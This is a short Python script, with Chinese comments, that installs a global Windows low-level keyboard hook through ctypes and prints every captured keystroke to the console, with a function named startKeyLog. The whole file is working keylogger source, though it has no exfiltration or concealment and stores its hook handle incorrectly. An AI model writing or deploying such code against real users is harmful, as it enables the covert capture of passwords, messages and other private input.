import sys
from ctypes import *
from ctypes.wintypes import DWORD, HHOOK, HINSTANCE, MSG, WPARAM, LPARAM
'''
hook 钩子函数， 可以在系统调用函数前就捕获消息， 然后得到函数的空值权限， 同时可以强制结束消息
'''
user32 = CDLL("user32.dll")# 创建窗口和发送消息
kernel32 = CDLL("kernel32.dll")# 控制系统内存，数据的输出和中断处理


class KBDLLHOOKSTRUCT(Structure):
    _fields_ = [
        ('vkCode', DWORD),
        ('scanCode', DWORD),
        ('flags', DWORD),
        ('time', DWORD),
        ('dwExtraInfo', DWORD)]


def uninstallHookProc(hooked):
    if hooked is None:
        return
    user32.UnhookWindowsHookEx(hooked)
    hooked = None


def hookProc(nCode, wParam, lParam):
    if nCode < 0:
        return user32.CallNextHookEx(hooked, nCode, wParam, lParam)
    else:
        if wParam == 256:
            if 162 == lParam.contents.value:
                print("Ctrl pressed, call Hook uninstall()")
                uninstallHookProc(hooked)
                sys.exit(-1)
            capsLock = user32.GetKeyState(20)
            # kb_struct = cast(lParam, POINTER(KBDLLHOOKSTRUCT))
            if lParam.contents.value==13:
                print("\n")
            elif capsLock:
                print(chr(lParam.contents.value),end="")
            else:
                print(chr(lParam.contents.value+32),end="")
    return user32.CallNextHookEx(hooked, nCode, wParam, lParam)


def startKeyLog():
    msg = MSG()
    user32.GetMessageA(byref(msg), 0, 0, 0)


def installHookProc(hooked, pointer):
    hooked = user32.SetWindowsHookExA(
        13,
        pointer,
        kernel32.GetModuleHandleW(),
        0
    )
    if not hooked:
        return False
    return True


HOOKPROC = WINFUNCTYPE(c_int, c_int, c_int, POINTER(DWORD))
pointer = HOOKPROC(hookProc)
hooked = None
if installHookProc(hooked, pointer):
    print("Hook installed")
    try:
        msg = MSG()
        user32.GetMessageA(byref(msg), 0, 0, 0)
    except KeyboardInterrupt as kerror:
        uninstallHookProc(hooked)
        print("Hook uninstall...")
else:
    print("Hook installed error")